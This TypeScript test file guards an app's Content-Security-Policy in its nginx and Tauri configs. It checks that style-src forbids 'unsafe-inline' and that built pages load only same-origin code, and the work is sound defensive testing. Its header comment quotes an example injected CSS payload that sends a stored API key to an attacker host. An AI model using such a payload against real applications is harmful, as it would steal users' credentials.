/* CSP regression guard. The app holds a BYO model key in browser storage, so the
   Content-Security-Policy is a real security control, not boilerplate — and the
   web (nginx) and desktop (Tauri) policies have to agree on it. The shipped
   loophole this locks shut: `style-src` must NOT carry 'unsafe-inline'. It was
   never load-bearing — MEW ships one extracted stylesheet and zero inline
   <style>/style="" strings, and React's style={{…}} props are CSSOM writes
   (element.style.x = y) that style-src does not govern — so its only effect was
   to permit injected inline CSS (e.g. `background-image: url(https://attacker/?k=…)`
   to exfiltrate the key). These assertions read the two policy files directly
   (a mock can't catch a hand-edit that re-adds it) and, when a production build
   is present, confirm the bundle really has no inline styles to need it. */

import { readFileSync, existsSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, resolve } from 'node:path'
import { describe, expect, it } from 'vitest'

const here = dirname(fileURLToPath(import.meta.url)) // app/src/adapters/__tests__
const APP = resolve(here, '../../..') //                app/
const REPO = resolve(APP, '..') //                      repo root

const NGINX_CONF = resolve(APP, 'docker/security-headers.conf')
const TAURI_CONF = resolve(REPO, 'desktop/src-tauri/tauri.conf.json')
const DIST_HTML = resolve(APP, 'dist/index.html')

/** Pull the CSP string out of the nginx `add_header Content-Security-Policy "…"`. */
function webCsp(): string {
  const conf = readFileSync(NGINX_CONF, 'utf8')
  const m = conf.match(/add_header\s+Content-Security-Policy\s+"([^"]+)"/i)
  if (!m) throw new Error('no Content-Security-Policy add_header in security-headers.conf')
  return m[1]
}

/** The desktop CSP is the typed `app.security.csp` field of tauri.conf.json. */
function desktopCsp(): string {
  const conf = JSON.parse(readFileSync(TAURI_CONF, 'utf8')) as {
    app?: { security?: { csp?: string } }
  }
  const csp = conf.app?.security?.csp
  if (!csp) throw new Error('no app.security.csp in tauri.conf.json')
  return csp
}

/** Isolate one directive (e.g. "style-src") from a CSP string. */
function directive(csp: string, name: string): string {
  const found = csp
    .split(';')
    .map((d) => d.trim())
    .find((d) => d === name || d.startsWith(name + ' '))
  if (!found) throw new Error(`directive ${name} missing from CSP: ${csp}`)
  return found
}

const POLICIES: ReadonlyArray<[string, () => string]> = [
  ['web (security-headers.conf)', webCsp],
  ['desktop (tauri.conf.json)', desktopCsp],
]

describe('CSP — style-src is tight (no unsafe-inline)', () => {
  it.each(POLICIES)('%s declares a style-src', (_label, csp) => {
    expect(directive(csp(), 'style-src')).toMatch(/^style-src\b/)
  })

  it.each(POLICIES)("%s keeps style-src 'self'", (_label, csp) => {
    expect(directive(csp(), 'style-src')).toContain("'self'")
  })

  it.each(POLICIES)("%s has NO 'unsafe-inline' in style-src", (_label, csp) => {
    // the regression that matters: re-opening CSS-based key exfiltration.
    expect(directive(csp(), 'style-src')).not.toContain("'unsafe-inline'")
  })

  it.each(POLICIES)("%s has no 'unsafe-inline' or 'unsafe-eval' anywhere", (_label, csp) => {
    expect(csp()).not.toContain("'unsafe-inline'")
    expect(csp()).not.toContain("'unsafe-eval'")
  })

  it('web and desktop agree on the style-src directive', () => {
    expect(directive(webCsp(), 'style-src')).toBe(directive(desktopCsp(), 'style-src'))
  })

  it('still allows the GIS origin styles need (accounts.google.com)', () => {
    for (const [, csp] of POLICIES) {
      expect(directive(csp(), 'style-src')).toContain('https://accounts.google.com')
    }
  })
})

/* The premise that lets 'unsafe-inline' go: the production bundle carries no
   inline styles. Only assert when a build exists — the gate runs vitest before
   `pnpm build`, so on a clean tree dist/ is absent and this skips cleanly. */
describe.skipIf(!existsSync(DIST_HTML))('CSP — built bundle has no inline styles', () => {
  const html = existsSync(DIST_HTML) ? readFileSync(DIST_HTML, 'utf8') : ''

  it("links an external stylesheet (style-src 'self' covers it)", () => {
    expect(html).toMatch(/<link[^>]+rel="stylesheet"[^>]*>/i)
  })

  it('has no inline <style> block on the shell', () => {
    expect(html).not.toMatch(/<style[\s>]/i)
  })

  it('has no inline style="" attribute on the shell', () => {
    expect(html).not.toMatch(/\bstyle\s*=\s*"/i)
  })
})

/* ── SRI decision guard (follow-up to #198; ARCHITECTURE §8 + D11) ───────────
   Subresource Integrity was deliberately NOT adopted: the self-hosted bundle is
   same-origin + Vite content-hashed (integrity-by-name), and the only cross-origin
   script — Google Identity Services — rotates with no stable hash and is injected
   at runtime, so it can't be pinned. That makes the CSP allowlist the real control.
   These assertions lock the invariant the decision rests on, so a future change
   can't quietly invalidate it: the executable scripts/styles a page can load must
   stay '(self)' + at most the one audited GIS origin (any *other* cross-origin
   script origin is exactly the mutable asset SRI exists to protect — its arrival
   should fail loudly and re-open the SRI question), and the built shell must emit
   only same-origin resource tags (no static cross-origin <script>/<link> that SRI
   should have guarded). If a future asset breaks either invariant, revisit D11. */

/** The one cross-origin origin MEW's policy legitimately admits for code/styles. */
const GIS_ORIGIN = 'https://accounts.google.com'

/** Cross-origin tokens in a directive: anything that isn't a keyword/'self'/scheme. */
function crossOriginSources(dir: string): string[] {
  return dir
    .split(/\s+/)
    .slice(1) // drop the directive name
    .filter((t) => /^https?:\/\//i.test(t)) // explicit http(s) origins only
}

describe('CSP — SRI decision invariant (script/style stay self + audited GIS only)', () => {
  it.each(POLICIES)('%s script-src admits no cross-origin source beyond GIS', (_label, csp) => {
    expect(crossOriginSources(directive(csp(), 'script-src'))).toEqual([GIS_ORIGIN])
  })

  it.each(POLICIES)('%s style-src admits no cross-origin source beyond GIS', (_label, csp) => {
    expect(crossOriginSources(directive(csp(), 'style-src'))).toEqual([GIS_ORIGIN])
  })

  it.each(POLICIES)(
    '%s never allows arbitrary code via wildcard/blob/data in script-src',
    (_label, csp) => {
      const dir = directive(csp(), 'script-src')
      expect(dir).not.toMatch(/\*/) // no host wildcard
      expect(dir).not.toContain('blob:')
      expect(dir).not.toContain('data:')
    }
  )

  it('web and desktop agree on the script-src directive', () => {
    expect(directive(webCsp(), 'script-src')).toBe(directive(desktopCsp(), 'script-src'))
  })
})

/* The flip side of "no SRI": prove there's nothing for SRI to have protected — the
   built shell loads scripts/styles only from its own origin (relative or root-
   rooted URLs), so the content-hashed filename is the integrity story. The lone
   cross-origin script (GIS) is injected at runtime, so it legitimately never
   appears as a static tag here. Skips cleanly when dist/ is absent (clean tree). */
describe.skipIf(!existsSync(DIST_HTML))(
  'SRI decision — built shell loads only same-origin code/styles',
  () => {
    const html = existsSync(DIST_HTML) ? readFileSync(DIST_HTML, 'utf8') : ''

    /** Same-origin = relative or root-relative; an absolute http(s) URL is cross-origin. */
    const isSameOrigin = (url: string) => !/^https?:\/\//i.test(url) && !url.startsWith('//')

    it('every <script src> on the shell is same-origin', () => {
      const srcs = [...html.matchAll(/<script\b[^>]*\bsrc\s*=\s*"([^"]+)"/gi)].map((m) => m[1])
      for (const src of srcs)
        expect(isSameOrigin(src), `cross-origin script tag: ${src}`).toBe(true)
    })

    it('every <link rel="stylesheet" href> on the shell is same-origin', () => {
      const links = [...html.matchAll(/<link\b[^>]*\brel="stylesheet"[^>]*>/gi)].map((m) => m[0])
      for (const tag of links) {
        const href = tag.match(/\bhref\s*=\s*"([^"]+)"/i)?.[1] ?? ''
        expect(isSameOrigin(href), `cross-origin stylesheet tag: ${href}`).toBe(true)
      }
    })
  }
)
